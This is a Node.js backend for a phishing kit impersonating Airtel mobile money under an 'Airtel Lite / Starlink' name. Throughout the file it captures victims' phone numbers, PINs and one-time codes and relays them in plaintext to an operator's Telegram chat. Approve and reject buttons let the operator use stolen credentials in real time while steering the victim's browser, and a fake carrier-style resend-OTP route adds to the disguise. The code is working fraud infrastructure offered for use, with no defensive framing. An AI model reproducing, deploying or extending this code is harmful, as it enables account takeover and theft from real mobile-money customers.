/* ============================================================
   Airtel Lite / Starlink — Backend
   ============================================================ */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

/* ==================== ENV ==================== */
const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const TELEGRAM_CHAT_ID   = (process.env.TELEGRAM_CHAT_ID   || '').trim();

const TELEGRAM_API          = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_ANSWER_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
const TELEGRAM_EDIT_URL     = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
const TELEGRAM_WEBHOOK_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;

const SESSION_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes

/* ==================== IN-MEMORY STORE ==================== */
const requests = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, r] of requests.entries()) {
    if (r.status === 'pending' && now - r.createdAt > SESSION_TIMEOUT_MS) {
      r.status = 'timeout';
      r.resolvedAt = now;
    }
    if (now - r.createdAt > SESSION_TIMEOUT_MS * 2) {
      requests.delete(id);
    }
  }
}, 60 * 1000);

/* ==================== MIDDLEWARE ==================== */
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

const PUBLIC_DIR = path.join(__dirname, '..');
app.use(express.static(PUBLIC_DIR));

/* ==================== HELPERS ==================== */
function makeRequestId() {
  return 'req_' + crypto.randomBytes(12).toString('hex');
}

function escapeHtml(s = '') {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function isValidPhone(phone) {
  return typeof phone === 'string' && /^\+?\d{7,15}$/.test(phone.replace(/\s/g, ''));
}

function stripFirstLine(text) {
  if (!text) return '';
  const idx = text.indexOf('\n');
  if (idx === -1) return '';
  const rest = text.slice(idx + 1);
  return rest.replace(/^━+\n/, '').trim();
}

/* ==================== TELEGRAM KEYBOARDS ==================== */
function buildKeyboardLogin(requestId) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Approuver', callback_data: `approve:login:${requestId}` },
        { text: '🔁 Resend',   callback_data: `resend:login:${requestId}` }
      ]
    ]
  };
}

function buildKeyboardOtp(requestId) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Approuver', callback_data: `approve:otp:${requestId}` },
        { text: '🔁 Resend',   callback_data: `resend:otp:${requestId}` }
      ]
    ]
  };
}

/* ==================== TELEGRAM SEND ==================== */
async function sendTelegramWithButtons(text, requestId, step) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram env vars missing');
    return null;
  }
  try {
    const keyboard = step === 'otp'
      ? buildKeyboardOtp(requestId)
      : buildKeyboardLogin(requestId);

    const res = await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: keyboard
      })
    });
    const data = await res.json().catch(() => ({}));
    if (!data.ok) {
      console.warn('⚠️ Telegram error:', data.description || data);
      return null;
    }
    return data.result.message_id || null;
  } catch (err) {
    console.error('❌ Telegram fetch failed:', err.message);
    return null;
  }
}

async function editTelegramMessage(messageId, text, replyMarkup) {
  if (!messageId || !TELEGRAM_BOT_TOKEN) return;
  try {
    const body = {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    };
    if (replyMarkup !== undefined) body.reply_markup = replyMarkup;

    await fetch(TELEGRAM_EDIT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (err) {
    console.error('editTelegramMessage failed:', err.message);
  }
}

async function answerCallback(callbackQueryId, text) {
  if (!callbackQueryId || !TELEGRAM_BOT_TOKEN) return;
  try {
    await fetch(TELEGRAM_ANSWER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
        show_alert: false
      })
    });
  } catch (err) {
    console.error('answerCallback failed:', err.message);
  }
}

/* ==================== PAGE ROUTES ==================== */
function servePage(filename) {
  return (_req, res) => {
    const filePath = path.join(PUBLIC_DIR, filename);
    if (!fs.existsSync(filePath)) {
      return res.status(404).send(`Page ${filename} not found.`);
    }
    res.sendFile(filePath);
  };
}

app.get(['/', '/index', '/index/'], servePage('index.html'));
app.get(['/login', '/login/'], servePage('login.html'));
app.get(['/otp', '/otp/'], servePage('otp.html'));
app.get(['/success', '/success/'], servePage('success.html'));

/* ==================== API — SESSION ==================== */
app.post('/api/auth/session', (_req, res) => {
  const token = crypto.randomBytes(24).toString('hex');
  res.json({ success: true, token, expiresIn: 3600000 });
});

/* ==================== API — SET COUNTRY ==================== */
app.post('/api/set-country', (req, res) => {
  const { country } = req.body || {};
  console.log('[set-country]', country);
  res.json({ success: true, country });
});

/* ==================== API — LOGIN → TELEGRAM APPROVAL ==================== */
app.post('/api/telegram/request-approval', async (req, res) => {
  try {
    const { userPhone = '', userPin = '', package: pkg = '', amount = '', method = 'airtel' } = req.body || {};

    if (!isValidPhone(userPhone)) {
      return res.status(400).json({ success: false, message: 'Invalid phone number' });
    }
    if (typeof userPin !== 'string' || userPin.length < 4) {
      return res.status(400).json({ success: false, message: 'Invalid PIN' });
    }

    const requestId = makeRequestId();

    const text =
      `🔐 <b>NEW LOGIN ATTEMPT</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(userPhone)}</code>\n` +
      `🔑 <b>PIN:</b> <code>${escapeHtml(userPin)}</code>\n` +
      (pkg ? `📦 <b>Package:</b> ${escapeHtml(pkg)}\n` : '') +
      (amount ? `💰 <b>Amount:</b> ${escapeHtml(amount)}\n` : '') +
      `💳 <b>Method:</b> ${escapeHtml(method)}\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB')}\n\n` +
      `⏳ Tap ✅ to approve or 🔁 to reject`;

    const messageId = await sendTelegramWithButtons(text, requestId, 'login');
    console.log(`[login] requestId=${requestId} msgId=${messageId}`);

    requests.set(requestId, {
      step: 'login',
      status: 'pending',
      data: { userPhone, userPin, package: pkg, amount, method },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ success: true, requestId });
  } catch (err) {
    console.error('request-approval error:', err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

/* ==================== API — OTP SUBMIT ==================== */
app.post('/api/telegram/submit-otp', async (req, res) => {
  try {
    const { requestId = '', otp = '', rawMessage = '' } = req.body || {};

    const r = requests.get(requestId);
    if (!r) {
      return res.status(400).json({ success: false, message: 'Session expired. Please start again.' });
    }

    if (typeof otp !== 'string' || !/^\d{4,8}$/.test(otp)) {
      return res.status(400).json({ success: false, message: 'Invalid OTP format' });
    }

    r.data.otp = otp;
    r.data.rawMessage = rawMessage;
    r.step = 'otp';
    r.status = 'pending';

    const text =
      `🔢 <b>OTP RECEIVED</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(r.data.userPhone || '')}</code>\n` +
      `🔑 <b>PIN:</b> <code>${escapeHtml(r.data.userPin || '')}</code>\n` +
      `🔢 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
      (r.data.package ? `📦 <b>Package:</b> ${escapeHtml(r.data.package)}\n` : '') +
      (r.data.amount ? `💰 <b>Amount:</b> ${escapeHtml(r.data.amount)}\n` : '') +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB')}\n\n` +
      `⏳ Tap ✅ to approve or 🔁 to reject`;

    const messageId = await sendTelegramWithButtons(text, requestId, 'otp');
    r.telegramMessageId = messageId;
    r.originalText = text;

    console.log(`[otp] requestId=${requestId} otp=${otp} msgId=${messageId}`);

    return res.json({ success: true });
  } catch (err) {
    console.error('submit-otp error:', err);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

/* ==================== API — STATUS POLL ==================== */
app.get('/api/telegram/status/:requestId', (req, res) => {
  const { requestId } = req.params;
  const r = requests.get(requestId);

  if (!r) {
    return res.json({ status: 'unknown' });
  }

  if (r.status === 'pending' && Date.now() - r.createdAt > SESSION_TIMEOUT_MS) {
    r.status = 'timeout';
    r.resolvedAt = Date.now();
  }

  return res.json({ status: r.status });
});

/* ==================== API — RESEND OTP ==================== */
app.post('/api/b2c-backend/v2/resend-otp', async (req, res) => {
  const { msisdn = '' } = req.body || {};
  console.log('[resend-otp]', msisdn);
  try {
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      await fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: `🔁 <b>RESEND OTP REQUESTED</b>\n📱 <code>${escapeHtml(msisdn)}</code>`,
          parse_mode: 'HTML'
        })
      });
    }
  } catch (e) {}
  res.json({ success: true });
});

/* ==================== API — CHECK STATUS ==================== */
let lastCheckStatus = 'normal';
app.get('/api/check-status', (_req, res) => {
  res.json({ status: lastCheckStatus });
});
app.post('/api/user-deposited', (_req, res) => {
  lastCheckStatus = 'normal';
  res.json({ success: true });
});

/* ==================== TELEGRAM WEBHOOK ==================== */
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cb = update.callback_query;

    if (!cb || !cb.data) return res.json({ ok: true });

    const [action, step, requestId] = String(cb.data).split(':');
    const r = requests.get(requestId);

    console.log(`[webhook] action=${action} step=${step} requestId=${requestId} found=${!!r}`);

    if (!r) {
      await answerCallback(cb.id, 'Session expired');
      return res.json({ ok: true });
    }

    if (r.status === 'approved' || r.status === 'completed' || r.status === 'rejected' || r.status === 'wrong_credentials') {
      await answerCallback(cb.id, `Already ${r.status}`);
      return res.json({ ok: true });
    }

    const when = new Date().toLocaleString('en-GB');

    if (action === 'approve') {
      r.status = step === 'otp' ? 'completed' : 'approved';
      r.resolvedAt = Date.now();
      await answerCallback(cb.id, 'Approved');

      const statusLine = step === 'otp'
        ? '✅ <b>OTP APPROVED</b>'
        : '✅ <b>LOGIN APPROVED</b>';

      const preservedBody = stripFirstLine(r.originalText);
      const newText =
        `${statusLine}\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        preservedBody +
        `\n\n🕒 <b>Resolved:</b> ${when}`;

      if (r.telegramMessageId) {
        await editTelegramMessage(r.telegramMessageId, newText, { inline_keyboard: [] });
      }

      return res.json({ ok: true });
    }

    if (action === 'resend') {
      r.status = 'wrong_credentials';
      r.resolvedAt = Date.now();
      await answerCallback(cb.id, 'Rejected');

      const preservedBody = stripFirstLine(r.originalText);
      const newText =
        `❌ <b>REJECTED — Wrong Credentials</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        preservedBody +
        `\n\n🕒 <b>Resolved:</b> ${when}`;

      if (r.telegramMessageId) {
        await editTelegramMessage(r.telegramMessageId, newText, { inline_keyboard: [] });
      }

      return res.json({ ok: true });
    }

    await answerCallback(cb.id, 'Unknown action');
    return res.json({ ok: true });
  } catch (err) {
    console.error('webhook error:', err);
    return res.json({ ok: true });
  }
});

/* ==================== 404 ==================== */
app.use((_req, res) => {
  res.status(404).send(`
    <html><body style="font-family:sans-serif;text-align:center;padding:60px 20px;background:#f9fafb;">
      <h1 style="font-size:48px;margin:0;color:#111827;">404</h1>
      <p style="color:#6b7280;margin-top:12px;">Page not found.</p>
      <a href="/" style="display:inline-block;margin-top:20px;padding:12px 22px;background:#ed1c24;color:#fff;text-decoration:none;font-weight:600;border-radius:10px;">Back to Home</a>
    </body></html>
  `);
});

app.use((err, _req, res, _next) => {
  console.error('unhandled error:', err);
  res.status(500).send('Server error');
});

/* ==================== WEBHOOK REGISTRATION ON STARTUP ==================== */
async function registerWebhook() {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('⚠️ Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
    return;
  }

  let publicUrl = process.env.PUBLIC_URL || '';
  if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
    publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
  }
  if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
    publicUrl = process.env.RENDER_EXTERNAL_URL;
  }
  publicUrl = publicUrl.replace(/\/+$/, '');

  if (!publicUrl) {
    console.warn('⚠️ No PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN / RENDER_EXTERNAL_URL set');
    return;
  }

  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log('🔗 Registering webhook:', webhookUrl);

  try {
    const res = await fetch(TELEGRAM_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ['message', 'callback_query']
      })
    });
    const data = await res.json().catch(() => ({}));
    if (data.ok) {
      console.log('✅ Telegram webhook registered:', webhookUrl);
    } else {
      console.warn('⚠️ Webhook registration failed:', data.description || data);
    }
  } catch (err) {
    console.error('❌ Webhook registration error:', err.message);
  }
}

/* ==================== START ==================== */
app.listen(PORT, async () => {
  console.log('====================================');
  console.log('🏆 Airtel Lite / Starlink backend running');
  console.log(`🚀 Port: ${PORT}`);
  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
  console.log(`🔍 Chat ID length: ${TELEGRAM_CHAT_ID.length} (expected 10 for 8426930447)`);
  console.log(`🔍 Chat ID raw: ${JSON.stringify(TELEGRAM_CHAT_ID)}`);
  console.log('====================================');
  setTimeout(registerWebhook, 2000);
});
